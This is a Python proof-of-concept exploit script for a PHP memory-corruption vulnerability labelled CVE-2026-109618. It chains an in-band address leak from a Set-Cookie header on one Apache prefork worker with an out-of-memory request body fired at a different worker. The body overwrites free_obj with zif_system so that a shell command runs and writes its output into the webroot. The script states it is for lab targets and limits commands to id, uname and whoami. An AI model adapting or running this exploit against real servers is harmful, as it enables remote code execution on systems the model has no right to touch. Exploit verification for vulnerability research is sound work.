#!/usr/bin/env python3
"""CVE-2026-109618 — fully in-band chain (leak on one worker, fire on another).

The repo's 109619 leak works at 128M; the 109618 OOM body works at 8M. They
cannot share one worker (the 8M body after a 128M leak lands on a fully
written table). Apache prefork children are forked, so **all workers share
the same libphp and ZendMM chunk mappings**. This POC:

  1. pins the A1/B1 leak to one worker at 128M and reads libphp + chunk from
     the in-band `Set-Cookie` disclosure;
  2. holds N-1 workers and fires the 8M OOM body on a *different* (fresh)
     worker, using the leaked libphp/chunk and `free_obj = zif_system`;
  3. reads the proof over HTTP (`id>/var/www/html/<proof>`).

No `/proc` address reads, no debugger, no gdb. The only lab helper is the
optional worker-identity endpoint used to avoid the leak worker; without
it the POC rotates holders and retries.

Usage (lab-109618-fork, 4 workers, /hi 128M, /lo 8M, writable webroot):
  python3 poc/verify_109618_inband.py \
      --target 127.0.0.1:18152 --cmd id \
      --leak-path /hi/index.php --fire-path /lo/index.php \
      --worker-id /lo/pid.php --proof lo/p --offset 0x67400

Lab targets only; fixed benign command only.
"""

import argparse
import os
import re
import sys
import time

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from php2shell import amplify, cve109618, pinning, probe, remote
from php2shell.guard import ALLOWED_CMDS, check_cmd

MARKERS = {"id": b"uid=", "uname": b"Linux", "whoami": b"www-data"}
WORKER_RE = re.compile(rb"x-worker:\s*(\d+)", re.I)


def header_worker(resp):
    for line in probe.header_lines(resp):
        m = WORKER_RE.search(line.encode("latin-1"))
        if m:
            return int(m.group(1))
    return None


def leak_once(host, port, path):
    probe.http_get(host, port, path, timeout=5, recv_timeout=5)
    amplify.send_chunked(host, port, path + remote.Q, remote.a1_body(),
                         "multipart/form-data", boundary="C" * 10, timeout=120)
    time.sleep(0.2)
    resp = amplify.send_chunked(host, port, path, remote.b1_body(),
                                "multipart/form-data", boundary="C" * 10,
                                timeout=600)
    i = resp.find(b"Set-Cookie: PHPSESSID=")
    if i < 0:
        raise RuntimeError(f"no leak cookie ({probe.status(resp)})")
    info = remote.parse_leak(resp, remote.PROFILES["aarch64"])
    return info["lib"], info["main_candidates"][0], header_worker(resp)


def select_fresh(pinner, worker_id, leak_pid, max_tries=8):
    """Rotate holders until the free worker is not the leak worker."""
    free = None
    for _ in range(max_tries):
        pids = pinner.sample_pids(worker_id, count=1)
        free = pids[0] if pids else None
        if free and (leak_pid is None or free != leak_pid):
            return free
        if pinner.holders:
            pinner.holders.pop().close()
        pinner.holders.append(
            pinning.Holder(pinner.host, pinner.port, pinner.path, 1 << 20).open()
        )
        time.sleep(0.35)
    return free


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", default="127.0.0.1:18152")
    ap.add_argument("--cmd", default="id", choices=ALLOWED_CMDS)
    ap.add_argument("--leak-path", default="/hi/index.php")
    ap.add_argument("--fire-path", default="/lo/index.php")
    ap.add_argument("--worker-id", default="/lo/pid.php",
                    help="lab worker-identity endpoint (pid=...); optional")
    ap.add_argument("--holders", type=int, default=3)
    ap.add_argument("--offset", type=lambda x: int(x, 0), default=0x67400,
                    help="B offset in the shared ZendMM chunk")
    ap.add_argument("--proof", default="lo/p",
                    help="webroot-relative proof path written by the command")
    ap.add_argument("--arch", choices=["aarch64", "x86_64"], default="aarch64")
    ap.add_argument("--retries", type=int, default=6,
                    help="fire attempts when no worker-id endpoint is used")
    args = ap.parse_args()

    scheme, host, port = probe.parse_target(args.target)
    if scheme != "http":
        sys.exit("lab targets are plain HTTP")
    cmd = check_cmd(args.cmd)
    proof_url = "/" + args.proof.lstrip("/")
    proof_path = "/var/www/html/" + args.proof.lstrip("/")

    print("[*] CVE-2026-109618 in-band chain (leak worker -> fresh fire worker)")
    print(f"    target: {host}:{port}  leak: {args.leak_path}  fire: {args.fire_path}")
    print(f"    holders: {args.holders}  offset: {args.offset:#x}  cmd: {cmd!r}")
    print()

    # 1) leak pinned to one worker
    try:
        with pinning.WorkerPinner(host, port, holders=args.holders):
            lib, chunk, leak_pid = leak_once(host, port, args.leak_path)
    except RuntimeError as exc:
        print(f"[!] in-band leak failed: {exc}")
        print("    (patched 8.4.27 is expected to fail here: negative control)")
        return 1
    print(f"[1] leak: libphp={lib:#x} chunk={chunk:#x} leak_worker={leak_pid}")

    # 2) hold N-1 workers, fire on a fresh one (retry if no pid endpoint)
    body, zif = cve109618.build_body(
        lib, chunk, f"{cmd}>{proof_path}",
        b_off=args.offset, arch=args.arch,
    )
    proof_body = b""
    use_pid = bool(args.worker_id) and args.worker_id not in ("none", "-")
    with pinning.WorkerPinner(host, port, holders=args.holders) as wp:
        for attempt in range(1, args.retries + 1):
            if use_pid:
                free = select_fresh(wp, args.worker_id, leak_pid)
                print(f"[2] fresh worker: {free} (leak worker {leak_pid})")
            resp = cve109618.send(host, port, body, path=args.fire_path)
            print(f"[3] fire attempt {attempt}: {probe.status(resp)}  "
                  f"zif={zif:#x}  B={chunk + args.offset:#x}")
            time.sleep(0.8)
            r = probe.http_get(host, port, proof_url, timeout=10, recv_timeout=5)
            proof_body = probe.body(r)
            print(f"    proof GET {proof_url}: {probe.status(r)}  {len(proof_body)} B")
            if proof_body and MARKERS[cmd] in proof_body:
                break
            if use_pid:
                break
            # no pid endpoint: rotate one holder and try the other free worker
            if wp.holders:
                wp.holders.pop().close()
            wp.holders.append(
                pinning.Holder(wp.host, wp.port, wp.path, 1 << 20).open()
            )
            time.sleep(0.35)

    print()
    if proof_body and MARKERS[cmd] in proof_body:
        print("[EVIDENCE] IN-BAND 109618 RCE REPRODUCED")
        print("    - libphp + chunk came from the in-band Set-Cookie leak;")
        print("    - the fire ran on a different fork-shared worker;")
        print("    - free_obj = zif_system ran the fixed command;")
        print("    - no /proc address reads, no debugger.")
        return 0
    print("[!] no proof. Check that the free worker is not the leak worker,")
    print("    the /hi(128M) + /lo(8M) split, and the --offset (0x67400 here).")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
